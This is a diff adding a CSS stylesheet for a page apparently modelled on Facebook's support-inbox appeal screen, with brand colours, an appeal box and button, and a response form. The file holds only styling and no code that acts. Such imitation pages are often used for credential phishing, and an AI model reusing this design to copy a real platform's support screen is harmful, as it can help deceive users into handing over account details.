@@ -1,0 +1,238 @@
+.headeri{
+	background-color: #3a5998;
+	padding-top: 20px;
+	padding-bottom: 20px;
+}
+.headeri .logo{
+	height: 27px;
+}
+.headeri .input-group{
+	margin-bottom: 0px !important;
+}
+.headeri .input-group input[type=text]{
+	height: 35px;
+	border-radius: 0px;
+	border: 1px solid black;
+}
+.headeri .colonalogo{
+	padding-top:5px;
+}
+
+.afterheader{
+	padding-top: 12px;
+	padding-bottom: 12px;
+	background-color: #e8ebee;
+}
+.afterheader li{
+	list-style-type: none;
+	color: #3578e5;
+}
+.afterheader li a{
+	text-decoration: none;
+	font-weight: 600;
+	padding-bottom: 12px;
+	font-size: 13px;
+	border-bottom: 3px solid #3578e5;
+}
+.afterheader li i{
+	padding-right: 2px;
+}
+.afterheader .english{
+	color:#4267b2;
+	font-size: 12px;
+	padding-top:3px;
+}
+.contenti{
+	padding-top:30px;
+}
+
+.contenti .leftmenu ul{
+	list-style-type: none;
+}
+
+.contenti .leftmenu li{
+	font-size: 14px;
+	color: #444950;
+	padding-top: 4px;
+	padding-bottom: 4px;
+}
+
+.contenti .leftmenu li:hover{
+	background-color:#f6f6f7;
+}
+.contenthehe{
+	border:1px solid #dddfe2;
+	border-radius: 4px;
+}
+.contenthehe .pagesupportinbox{
+	display: none;
+}
+.contenthehe .message{
+	padding:20px;
+	border-bottom: 1px solid #dddfe2;
+}
+.contenthehe .message i{
+	font-size: 25px;
+	color:white;
+	background-color:#575d6d;
+	padding:14px;
+	border-radius: 50%;
+}
+
+.contenthehe .message .open{
+	background-color:#3b81d3;
+	color:#ffffff;
+	font-size: 12px;
+	margin-top:0px;
+	margin-bottom: 0px;
+	padding:4px 10px;
+	display: inline-block;
+	border-radius: 4px;
+	font-weight: 600;
+}
+.contenthehe .message .titlewe{
+	margin-bottom:5px;
+	font-weight: bold;
+}
+.contenthehe .message .case{
+	display: inline-block;
+	padding-left: 5px;
+	padding-top: 4px;
+	color:#90949c;
+	font-size: 14px;
+}
+.contenthehe .whatcanwedo{
+	padding:20px;
+	border-bottom: 1px solid #dddfe2;
+}
+.contenthehe .whatcanwedo .whatcanyoudo{
+	font-size: 11px;
+	color:#90949c;
+	font-weight: bold;
+}
+.contenthehe .appeal{
+	border: 1px solid #dddfe2;
+	border-radius: 4px;
+	padding:15px;
+}
+.contenthehe .appeal p{
+	margin-bottom: 0px;
+	color: #385898;
+	font-weight: bold;
+	font-size: 16px;
+}
+.contenthehe .appeal i{
+	text-align: right;
+	font-size: 25px;
+}
+
+.contenthehe .activity{
+	background-color: #f5f7f9;
+	padding:20px;
+	border-bottom: 1px solid #dddfe2;
+}
+.contenthehe .yourresponse{
+	background-color: #f5f7f9;
+	padding:20px;
+}
+.contenthehe .yourresponse i{
+	color:#fff;
+	font-size: 20px;
+	border-radius: 50%;
+	padding:10px;
+	background-color:#d1d5d9;
+}
+.contenthehe .activityp{
+	font-size: 11px;
+	color:#90949c;
+	font-weight: bold;
+}
+.contenthehe .activity i{
+	color:#3a5998;
+	font-size: 40px;
+}
+.contenthehe .ourmessage p{
+	margin-bottom: 0px;
+	font-size: 14px;
+	color:#4b4f56;
+}
+
+.contenthehe .yourresponse p{
+	margin-bottom: 0px;
+	font-size: 14px;
+	color:#4b4f56;
+}
+
+.contenthehe .butoniappeal{
+	background-color:#4267b2;
+	border:1px solid #4267b2;
+	color:white;
+	margin-top:10px;
+	font-size: 13px;
+	font-weight: 500;
+	padding:7px 20px;
+	border-radius: 2px;
+}
+
+.contenthehe .appealfooter{
+	padding:20px;
+}
+.footer{
+	padding-top:80px;
+	padding-bottom:30px;
+}
+.footer .icona{
+	text-align: center;
+    padding-top: 6px;
+}
+.footer i{
+	color:#dddfe2;
+	text-align: right;
+	font-size: 35px;
+}
+.footer ul{
+	list-style-type: none;
+	padding-left: 0px;
+}
+.footer li{
+	color:#8d949e;
+	font-size: 14px;
+	padding-top:5px;
+	padding-bottom: 5px;
+}
+
+.contenthehe .yourresponse label{
+	color:#90949c;
+	font-weight: bold;
+	font-size: 12px;
+}
+.contenthehe .yourresponse .form-group{
+	margin-bottom: 10px;
+}
+.contenthehe .yourresponse .form-control{
+	border-radius: 0px;
+}
+
+@media only screen and (max-width: 370px) {
+  .headeri .input-group input[type=text]{
+      display:none;
+  }
+  .colvogel{
+      padding-left:10px;
+  }
+  .contenthehe .message .titlewe{
+      font-size:15px;
+  }
+}
+
+@media only screen and (max-width: 380px) {
+  .coliwithoutpadding{
+      padding-left:15px !important;
+  }
+  .contenthehe .message i{
+     font-size:20px !important;
+  }
+  .coliyourpage{
+      padding-left:20px !important;
+  }
+}
